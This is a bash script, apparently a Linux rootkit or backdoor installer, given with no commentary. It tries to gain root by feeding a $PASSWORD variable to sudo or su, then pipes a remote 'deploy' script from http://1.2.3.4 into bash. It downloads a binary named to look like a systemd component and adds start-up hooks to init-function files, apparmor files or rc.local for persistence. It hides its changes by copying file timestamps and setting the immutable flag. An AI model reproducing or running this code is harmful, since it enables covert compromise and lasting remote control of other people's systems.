#!/bin/bash

BASE_URL="http://1.2.3.4"
ROOTY_URL=$BASE_URL/rooty
DEPLOY_URL=$BASE_URL/deploy

install_manager() {
		fetch $ROOTY_URL $1
		chmod 755 $1
		touch -r /etc/ld.so.conf $1
		chattr +i $1
}


install_ubuntu() {
	if [ ! -f /lib/systemd/systemd-manager ]; then
		install_manager /lib/systemd/systemd-manager

		chmod 777 /lib/lsb/init-functions.d/
		printf 'if [ -z "$( pidof systemd-manager )" ]; then\n\t/lib/systemd/systemd-manager &\nfi\n' > /lib/lsb/init-functions.d/41-systemd-manager
		chmod 755 /lib/lsb/init-functions.d/
		touch -r /etc/ld.so.conf /lib/lsb/init-functions.d/41-systemd-manager
		chattr +i /lib/lsb/init-functions.d/41-systemd-manager
		/lib/systemd/systemd-manager &
	fi
}

install_debian() {
	if [ ! -f /lib/systemd/systemd-manager ]; then
		install_manager /lib/systemd/systemd-manager

		printf 'if [ -z "$( pidof systemd-manager )" ]; then\n\t/lib/systemd/systemd-manager &\nfi\n' >> /lib/apparmor/rc.apparmor.functions
		touch -r /etc/ld.so.conf /lib/apparmor/rc.apparmor.functions
		chattr +i /lib/apparmor/rc.apparmor.functions
		/lib/systemd/systemd-manager &
	fi

}

install_centos () {
	if [ ! -f /usr/lib/systemd/systemd-manager ]; then
		install_manager /usr/lib/systemd/systemd-manager

		chmod 777 /etc/rc.d/rc.local
		printf 'if [ -z "$( pidof systemd-manager )" ]; then\n\t/lib/systemd/systemd-manager &\nfi\n' >> /etc/rc.d/rc.local
		chmod 755 /etc/rc.d/rc.local

		touch -r /etc/ld.so.conf /etc/rc.d/rc.local
		chattr +i /etc/rc.d/rc.local
		systemctl enable rc-local.service
		systemctl start rc-local.service

	fi

}

# fetch <url> <output_path>
fetch () {
	if [ ! -z "$( which curl )" ]; then
		$( which curl ) --silent -o $2 $1
	elif [ ! -z "$( which wget )" ]; then
		$( which wget ) --quiet -O $2 $1
	fi
}

# We have to run as root
if [ -z "$( id | grep uid=0)" ]; then
	if [ ! -z "$( which sudo )" ]; then
		sudo_path=$( which sudo )

		if [ ! -z "$( echo $PASSWORD | $sudo_path -S id | grep uid=0 )" ]; then
			curl --silent $DEPLOY_URL | $sudo_path /bin/bash
		fi
	elif [ ! -z "$( which su)" ]; then
		su_path=$( which su )

		if [ ! -z "$( echo $PASSWORD | $su_path -c id | grep uid=0 )" ]; then
			echo $PASSWORD | $su_path -c "curl --silent $DEPLOY_URL | /bin/bash"
		fi
	fi
	exit
fi

# Find the distribution
if [ -f /etc/centos-release ]; then
	install_centos

elif [ -f /etc/issue ]; then
	if [ ! -z "$( grep -i ubuntu /etc/issue )" ]; then
		if [ ! -z "$( grep '20.' /etc/issue )" ]; then
			install_debian	# Ubuntu 20 is supported by the better debian install
		else
			install_debian
		fi
	elif [ ! -z "$( grep -i debian /etc/issue )" ]; then
		install_debian
	else
		echo "Unknown debian based distribution"
	fi
else
	echo "Unknown distribution"
fi
